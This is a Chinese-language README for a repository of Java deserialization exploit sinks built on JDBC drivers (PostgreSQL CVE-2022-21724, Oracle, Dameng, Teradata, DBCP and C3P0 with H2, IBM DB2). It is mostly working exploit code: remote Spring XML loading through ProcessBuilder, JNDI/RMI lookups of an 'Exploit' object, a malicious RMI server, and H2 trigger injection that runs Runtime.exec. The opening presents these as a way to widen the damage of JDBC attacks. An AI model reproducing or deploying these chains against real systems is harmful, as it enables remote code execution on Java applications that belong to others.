# Deserial_Sink_With_JDBC

> 如果你：
>
> 厌倦了高版本JDK中TemplatesImpl已经被移除
>
> 寻找gadget却想不到sink
>
> 无法扩大JDBC攻击的危害
>
> ...
>
> 不妨试试以下JDBC与原生反序列化的结合
> 以下sink均为getter触发，可配合cb、fj、jackson等链子使用

---

### Postgresql

PostgreSQL的JDBC存在一个CVE-2022-21724，其影响范围是

> 9.4.1208 <=PgJDBC <42.2.25
>
> 42.3.0 <=PgJDBC < 42.3.2

Sink构造

```java
        String command = "jdbc:postgresql://node/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:2333/test.xml";
        PGSimpleDataSource dataSource = new PGSimpleDataSource();
        dataSource.setUrl(command);
```

利用`python3 -m http.server 2333`本地开启一个http服务，其中test.xml的文件内容为

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>open</value>
                <value>-a</value>
                <value>Calculator</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

具体代码见src/main/java/postgresql包下内容

### oracle

Sink构造

```java
        // sink
        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();
        oracleCachedRowSet.setDataSourceName("rmi://127.0.0.1:1099/Exploit");
```

具体代码见src/main/java/oracle包下内容

### Dameng(达梦)

Sink构造，构造时需要设置Reader和Writer为null，使得writeObject的时候忽略掉这2个不可序列化的field

```java
        DmdbRowSet dmdbRowSet = new DmdbRowSet();
        dmdbRowSet.setDataSourceName("rmi://127.0.0.1:1099/Exploit");
        dmdbRowSet.setReader(null);
        dmdbRowSet.setWriter(null);
```

具体代码见src/main/java/dameng包下内容

### Teradata

Sink构造，此gadget为[ppt](https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf)内容，不做过多讲解

```java
        String command = "open -a Calculator";
        TeraDataSource dataSource = new TeraDataSource();
        dataSource.setBROWSER(command);
        dataSource.setLOGMECH("BROWSER");
        dataSource.setDSName("127.0.0.1");
        dataSource.setDbsPort("10250");
```

`python3 fakeserver.py`开启恶意server

`python3 fakesso.py`开启恶意sso

具体代码见src/main/java/teradata包下内容

---

> 如果datasource并不能序列化，我们可以是用c3p0或dbcp来调用getConnection

### Dbcp H2

sink构造

```java
        // sink but use dbcp bypass jndi
        String command = "rmi://127.0.0.1:1099/Exploit";
        SharedPoolDataSource dataSource = new SharedPoolDataSource();
        dataSource.setDataSourceName(command);
```

同时为了应对高版本的JNDI注入，我们可以有如下恶意RMI Server

```java
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef(
                "javax.sql.DataSource",
                null,
                "", "", true,
                "org.apache.commons.dbcp2.BasicDataSourceFactory",
                null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
```

具体代码见src/main/java/dbcp2/h2包下内容

### C3p0 H2

sink构造

```java
        // sink
        String command = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
                "$$\n";
        ComboPooledDataSource dataSource = new ComboPooledDataSource();
        dataSource.setJdbcUrl(command);
```

具体代码见src/main/java/c3p0/h2包下内容

### C3p0 ibm db2

sink构造

```java
        String command = "jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=rmi://127.0.0.1:1099/Exploit;";
        ComboPooledDataSource dataSource = new ComboPooledDataSource();
        dataSource.setJdbcUrl(command);
```

具体代码见src/main/java/c3p0/ibmdb2包下内容

---

### Ref

- https://github.com/Y4tacker/JavaSec

- https://tttang.com/archive/1405/

- https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf

- https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/

  
